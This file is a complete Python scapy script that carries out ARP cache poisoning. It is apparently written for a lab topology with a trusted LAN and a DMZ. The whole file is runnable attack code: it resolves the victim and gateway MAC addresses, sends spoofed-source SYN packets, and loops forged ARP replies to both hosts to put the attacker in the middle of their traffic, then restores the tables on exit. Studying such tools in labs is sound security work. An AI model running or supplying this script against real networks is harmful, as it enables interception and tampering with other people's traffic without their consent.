#!/usr/bin/env python3
"""
ARP Cache Poisoning Attack Script
---------------------------------

This module implements an ARP cache poisoning attack in a segmented network topology
with trusted LAN and DMZ zones. The attack allows traffic interception between
hosts by manipulating the ARP tables of both a target host and the gateway router.

The script is designed to work with the provided network topology which consists of:
- Trusted LAN (10.1.0.0/24): Contains workstations (ws2, ws3)
- DMZ (10.12.0.0/24): Contains service servers (http, dns, ntp, ftp)
- Two routers (r1, r2) connecting these networks
- Internet connectivity through r2

By default, this targets the workstation ws3 (10.1.0.3) and the gateway router r1 (10.1.0.1),
effectively becoming a man-in-the-middle for all traffic between them.

Usage:
    python3 main.py [--target TARGET_IP] [--gateway GATEWAY_IP] [--http-server HTTP_IP] [--interval SECS]
"""

import argparse
import time
import sys
from scapy.all import Ether, ARP, IP, TCP, RandShort, srp, send, conf

# Disable verbose output from scapy
conf.verb = 0


def resolve_mac(target_ip):
    """
    Resolve the MAC address of a target IP using ARP.

    This function broadcasts an ARP request to the network and waits for a response
    from the target host. It's a necessary first step in the ARP poisoning attack
    as we need the actual MAC addresses of both the target and gateway.

    Args:
        target_ip (str): The IP address to resolve to a MAC address

    Returns:
        str: The MAC address of the target, or None if resolution fails
    """
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    packet = ether_frame / arp_request

    response = srp(packet, timeout=2, retry=3)[0]

    if response:
        return response[0][1].hwsrc
    return None


def poison_arp_cache(victim_ip, victim_mac, spoofed_source_ip):
    """
    Send a spoofed ARP response to poison a target's ARP cache.

    This function creates and sends a forged ARP reply packet that tricks the victim
    into associating the spoofed source IP with the attacker's MAC address. In the
    custom topology, this function is used to:
    1. Make the workstation think the attacker is the router (r1)
    2. Make the router think the attacker is the workstation

    Args:
        victim_ip (str): The IP address of the target to poison
        victim_mac (str): The MAC address of the target
        spoofed_source_ip (str): The IP address to impersonate (gateway or target)
    """
    arp_response = ARP(
        op=2,  # ARP Reply
        pdst=victim_ip,  # Destination IP (victim)
        hwdst=victim_mac,  # Destination MAC (victim)
        psrc=spoofed_source_ip  # Source IP (impersonated address)
    )
    send(arp_response)


def initiate_connection(target_host, source_ip):
    """
    Send a TCP SYN packet to initiate a connection with spoofed source IP.

    This function sends an initial TCP SYN packet to ensure that the target hosts
    have entries in their ARP cache. In our topology, this helps ensure that both
    the workstation and router have active ARP entries before we attempt poisoning.
    This is particularly useful for the DMZ servers like the HTTP server (10.12.0.10).

    Args:
        target_host (str): The IP address of the host to connect to
        source_ip (str): The IP address to use as the source (typically the target workstation)
    """
    syn_packet = IP(dst=target_host, src=source_ip) / TCP(
        dport=80,
        sport=RandShort(),
        flags="S"
    )
    send(syn_packet)


def restore_network(target_ip, target_mac, gateway_ip, gateway_mac):
    """
    Restore the original ARP mappings after the attack.

    This function is crucial for proper cleanup after the attack is complete.
    It sends legitimate ARP replies to both the target workstation and the gateway
    router, restoring the correct MAC-to-IP mappings. Without this step, network
    communication would remain disrupted after the attack concludes.

    In our topology, this restores the original mappings between:
    - The workstation (e.g., ws3 at 10.1.0.3)
    - The gateway router (r1 at 10.1.0.1)

    Args:
        target_ip (str): IP address of the target workstation
        target_mac (str): MAC address of the target workstation
        gateway_ip (str): IP address of the gateway router
        gateway_mac (str): MAC address of the gateway router
    """
    # Tell target the real MAC of the gateway
    target_restoration = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )

    # Tell gateway the real MAC of the target
    gateway_restoration = ARP(
        op=2,
        pdst=gateway_ip,
        hwdst=gateway_mac,
        psrc=target_ip,
        hwsrc=target_mac
    )

    # Send several times to ensure it takes effect
    print("\nRestoring ARP tables...")
    for _ in range(5):
        send(target_restoration)
        send(gateway_restoration)
        time.sleep(0.2)


def parse_arguments():
    """
    Parse command line arguments for the ARP poisoning attack.

    Configures default values appropriate for our network topology:
    - Target: ws3 (10.1.0.3) in the trusted LAN
    - Gateway: r1 (10.1.0.1) connecting the trusted LAN to the DMZ
    - HTTP Server: The web server (10.12.0.10) in the DMZ
    - Interval: Time between ARP poisoning packets

    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(description="ARP Cache Poisoning Attack Tool")
    parser.add_argument("--target", default="10.1.0.3", help="Target IP address (default: 10.1.0.3)")
    parser.add_argument("--gateway", default="10.1.0.1", help="Gateway IP address (default: 10.1.0.1)")
    parser.add_argument("--http-server", default="10.12.0.10", help="HTTP Server IP (default: 10.12.0.10)")
    parser.add_argument("--interval", type=float, default=1.0, help="Seconds between ARP packets (default: 1.0)")

    return parser.parse_args()


def main():
    """
    Main execution function for the ARP cache poisoning attack.

    This function orchestrates the attack workflow:
    1. Parse command-line arguments
    2. Send initial packets to populate ARP caches
    3. Resolve MAC addresses of the target and gateway
    4. Execute the ARP poisoning attack in a continuous loop
    5. Restore the network when interrupted

    The attack positions the attacker as a man-in-the-middle between a workstation
    in the trusted LAN and the gateway router, allowing traffic interception and
    potential manipulation.
    """
    args = parse_arguments()

    # Network configuration
    target_ip = args.target
    gateway_ip = args.gateway
    http_server_ip = args.http_server
    interval = args.interval

    print(f"[*] ARP Cache Poisoning Attack")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Gateway: {gateway_ip}")

    """
    Initialize with a connection to ensure ARP entries exist

    In the custom topology, sending an initial packet to the HTTP server helps 
    populate the ARP caches of the involved hosts and routers, making the
    subsequent poisoning more effective.
    """
    print(f"[*] Sending initial packets to populate ARP caches")
    initiate_connection(http_server_ip, target_ip)
    time.sleep(1)

    """
    Resolve MAC addresses of both the target and gateway

    For our topology, this typically resolves:
    - Target (ws3): A dynamically assigned MAC
    - Gateway (r1): The static MAC 00:00:00:00:01:00 as defined in the topology
    """
    print(f"[*] Resolving MAC addresses...")
    target_mac = resolve_mac(target_ip)
    if not target_mac:
        print(f"[!] Failed to resolve MAC address for {target_ip}")
        sys.exit(1)
    print(f"[+] Target MAC: {target_mac}")

    gateway_mac = resolve_mac(gateway_ip)
    if not gateway_mac:
        print(f"[!] Failed to resolve MAC address for {gateway_ip}")
        sys.exit(1)
    print(f"[+] Gateway MAC: {gateway_mac}")

    """
    Begin the ARP poisoning attack loop

    This continuously sends spoofed ARP packets to:
    1. The target workstation, claiming the attacker is the gateway
    2. The gateway router, claiming the attacker is the target workstation

    This effectively makes all traffic between the workstation and gateway
    (including traffic to DMZ servers and the internet) flow through the attacker.
    """
    print(f"[*] Starting ARP cache poisoning attack (Ctrl+C to stop)")
    try:
        packet_count = 0
        start_time = time.time()
        while True:
            # Tell target we are the gateway
            poison_arp_cache(target_ip, target_mac, gateway_ip)
            # Tell gateway we are the target
            poison_arp_cache(gateway_ip, gateway_mac, target_ip)

            packet_count += 2
            if packet_count % 10 == 0:
                elapsed = time.time() - start_time
                print(f"[*] Sent {packet_count} ARP packets in {elapsed:.1f} seconds")

            time.sleep(interval)
    except KeyboardInterrupt:
        # Cleanup when user interrupts
        restore_network(target_ip, target_mac, gateway_ip, gateway_mac)
        print(f"[+] ARP poisoning stopped after sending {packet_count} packets")


if __name__ == "__main__":
    main()
